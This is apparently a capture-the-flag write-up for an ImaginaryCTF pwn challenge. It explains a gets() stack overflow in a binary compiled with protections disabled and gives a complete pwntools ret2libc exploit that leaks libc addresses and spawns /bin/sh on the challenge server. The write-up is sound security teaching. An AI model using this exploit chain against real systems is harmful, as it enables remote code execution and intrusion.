### Program investigation
```python
#!/usr/bin/env python3

import os
import sys
import subprocess
import base64
import random
import uuid
import time
  

code1 = '''
#include <stdio.h>
  
int main(void) {
 char inp['''


code2 = '''];
 setvbuf(stdout,NULL,2,0);
 setvbuf(stdin,NULL,2,0);
 gets(inp);
 puts("Thanks!");
}

'''

  

art = '''
██████████████████████████
█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
█▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░█
█▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░█
█░░░██████▒▒▒░░░██████▒▒▒█
█░░░██████▒▒▒░░░██████▒▒▒█
█▒▒▒██████░░░▒▒▒██████░░░█
█▒▒▒██████░░░▒▒▒██████░░░█
█░░░▒▒▒░░░██████▒▒▒░░░▒▒▒█
█░░░▒▒▒░░░██████▒▒▒░░░▒▒▒█
█▒▒▒░░░████████████▒▒▒░░░█
█▒▒▒░░░████████████▒▒▒░░░█
█░░░▒▒▒████████████░░░▒▒▒█
█░░░▒▒▒████████████░░░▒▒▒█
█▒▒▒░░░███░░░▒▒▒███▒▒▒░░░█
█▒▒▒░░░███░░░▒▒▒███▒▒▒░░░█
█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
█░░░▒▒▒░░░▒▒▒░░░▒▒▒░░░▒▒▒█
██████████████████████████
'''

  

def compile(size):
 filename = "/tmp/bin" + str(uuid.uuid4())
 open(filename + ".c", "w").write(code1 + str(size) + code2)
 subprocess.run(["gcc", "-o", filename, filename + ".c", "-fno-stack-protector", "-no-pie"], capture_output=True) 
 os.remove(filename + ".c")
 return filename

  

def handler(signum, frame):
 print("Out of time!")

  

filename = compile(random.randint(20,1000))
binary = base64.b64encode(open(filename, "rb").read()).decode()
print(art)
print("I'll see you after you defeat the ender dragon!")
time.sleep(3)

  

print("---------------------------BEGIN  DATA---------------------------")
print(binary)
print("----------------------------END  DATA----------------------------")

  

subprocess.run([filename], stdin=sys.stdin, timeout=10)
os.remove(filename)
```

Ok program is very simple and vulnerable.
1. Python program generates c++ code with random array size what makes exploitation a little bit harder. 
2. Python program compiles procedural generated C++ code with "-fno-stack-protector", "-no-pie" settings what is a big security mistake.
3. Python program sends to user copy of the generated program encoded in base64 
4. Python run code written in C++ as a subprocess
	1. Subprocess gets data from user input without any size restriction and allocates it in array what can cause bufferoverflow 
	2. Subprocess says "Thanks!" and this is his end 
5. Python program removes file from disk

When we connect to the server, we will see cool Minecraft banner and compiled binary file encoded in base64 

## Checksec
As we can see program is vulnerable to Ret2Libc Bufferoverflow attack because only NX flags are enabled.  


## Exploitation 
In this challenge, we have only a few seconds to send exploit so we need to do all the steps automatically from python script which will send exploit and give us a shellcode.
Exploitation process
1. Decode given base64 string and scan it in search of array size (to overflow array we need to know his size). 
2. Generate and sends payload which will: 
	1. Overflow array (if we want to override any address on stack we need to overflow buffer)
	2. Return to address from stack (it seems to be useless but we need to keep stack alignment)
	3. Pop `got.puts` address to RDI register and return ("got" it's memory region where is stored addresses to external functions wich we need to leak it to guess libc version and calculate It's address)
	4. Run puts (to print puts address)
	5. Return to main (to run the second exploit which will use printed addresses)
3. Get printed by program address of `got.puts` \[which we will save in notepadd\]
4. Send one more time payload from second step but with `got.gets` in the third step. \[which we will save in notepadd\]
5. Check in online database for which libc version are typical this function addresses 
6. Get offsets from symbols table 
7. Run exploit from second step and dynamically calculate libc address (puts address - offset = libc base adress)
8. Send second payload which will:
	1. Overflow array 
	2. Return to address from stack (stack alignment)
	3. Pop "/bin/sh" string address to RDI register (it will be argument to "system" function) 
	4. Run system() function (it will run "/bin/sh" command and give us shell) 
9. Give us control 


### Array size scanner
In pattern I decided to use 

```x86asm
push   rbp
mov    rbp, rsp
sub    rsp, [ARRAY SIZE]
```
next three bytes after this instructions are in which determine array size
this operation in hex are:
```
48 89 E5 48 81 EC [? ? ?]
```
where array size are three question marks


Code which scan array in file via prepared pattern 
```python
from pwn import *
import base64
import struct
import os

server = remote("chal.imaginaryctf.org", 42020)



# get software dump
server.recvuntil("---------------------------BEGIN  DATA---------------------------")
server.recvline()
binary_base64 = server.recvline()
binary_hex = base64.b64decode(binary_base64).hex().upper()


# save data to file
exploit_binary = open('2hack', 'wb')
bytes_object = bytes.fromhex(binary_hex)
exploit_binary.write(bytes(bytes_object))
exploit_binary.close()
binary = ELF('./2hack')
context.binary = binary
os.chmod("./2hack", 0o777)


pattern_prefix = "4889E54881EC"
index = binary_hex.index(pattern_prefix) + 12
array_size = int(str(binary_hex[index + 4] + binary_hex[index + 5] + binary_hex[index + 2] + binary_hex[index + 3] + binary_hex[index] + binary_hex[index + 1]), base=16)
print("Array size: ", array_size)
padding = array_size + 8
```

## First payload

To generate first exploit we need to find two gadgets, main address.
To find gadgets addressys I used ROPgadget which returned:
```
0x0000000000401016 : ret
0x000000000040120b : pop rdi ; ret
```

and from objdump i get "main" address:
```0000000000401142 <main>:```

to get puts plt and got adress I used pwntools build in function
```
binary.got.puts
binary.plt.puts
```

full code of payload is:
```python
payload = b'\x79' * padding
payload += p64(0x0000000000401016)    # ret
payload += p64(0x000000000040120b)    # pop rdi; ret
payload += p64(binary.got.puts)       # address of linked puts function (it will be passed as argument to puts)
payload += p64(binary.plt.puts)       # address of linked puts function 
payload += p64(0x0000000000401142)    # main
```

After sending this payload I got puts address which was:
`puts: 0x7f2807370910`

Nextly, I edited this payload to leak gets function address.  
After modification it looks like:
```python
payload = b'\x79' * padding
payload += p64(0x0000000000401016)    # ret
payload += p64(0x000000000040120b)    # pop rdi; ret
payload += p64(binary.got.gets)       # address of linked gets function (it will be passed as argument to puts)
payload += p64(binary.plt.puts)       # address of linked puts function
payload += p64(0x0000000000401142)    # main
```
Gets address was:
```gets: 0x7f3313d3f040```

## Libc version

To determinate which Libc version is running in the server we need to check which version of libc use offset like this.  
To do this I used https://libc.blukat.me// and past there last 3 characters from puts and gets address. Website returned to me libc version running at the server  
and usefull offsets (especially: system function and "/bin/sh" string)  

## Second payload
When we know libc address we can run not linked function directly from library in our case it will be system("/bin/sh").  
"system()" command will run shell and give us controll at the system what will enable us to run every command at victim server.

```python
payload = b'\x79' * padding           # padding
payload += p64(0x0000000000401016)    # ret
payload += p64(0x000000000040120b)    # pop rdi; ret
payload += p64(libc + 0x181519)       # "/bin/sh" 
payload += p64(libc + 0x0449c0)       # system()
```

Exploit code:
```python
from pwn import *
import base64
import struct
import os
server = remote("chal.imaginaryctf.org", 42020)



# get software dump
server.recvuntil("---------------------------BEGIN  DATA---------------------------")
server.recvline()
binary_base64 = server.recvline()
binary_hex = base64.b64decode(binary_base64).hex().upper()




# save data to file
exploit_binary = open('2hack', 'wb')
bytes_object = bytes.fromhex(binary_hex)
exploit_binary.write(bytes(bytes_object))
exploit_binary.close()
binary = ELF('./2hack')
context.binary = binary
os.chmod("./2hack", 0o777)




# scan with pattern
pattern_prefix = "4889E54881EC"
index = binary_hex.index(pattern_prefix) + 12
array_size = int(str(binary_hex[index + 4] + binary_hex[index + 5] + binary_hex[index + 2] + binary_hex[index + 3] + binary_hex[index] + binary_hex[index + 1]), base=16)
print("Array size: ", array_size)
padding = array_size + 8



# creating first payload
payload = b'\x79' * padding
payload += p64(0x0000000000401016)    # ret
payload += p64(0x000000000040120b)    #pop rdi; ret
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(0x0000000000401142)    # main
server.sendline(payload)
print("useless line: ", server.recvline())
print("useless line: ", server.recvline())





puts_addr = server.recvline()            # recv leaked puts addr
print("raw puts_addr", puts_addr)
puts_addr = puts_addr[:-1]
puts_addr += b'\x00\x00'
print("edited puts_adr", puts_addr)
puts_addr = u64(puts_addr)
libc = puts_addr - 0x071910




print("puts: ", hex(puts_addr))
print("libc: ", hex(libc))


payload = b'\x79' * padding
payload += p64(0x0000000000401016)    # ret
payload += p64(0x000000000040120b)    #pop rdi; ret
payload += p64(libc + 0x181519)
payload += p64(libc + 0x0449c0) # system()
server.sendline(payload)
server.interactive()
```

## Credits: 
Writeup by: Filip "Ret2Me" Poplewski</br>
Solved by: Filip "Ret2Me" Poplewski</br>
Team: WaletSec</br>
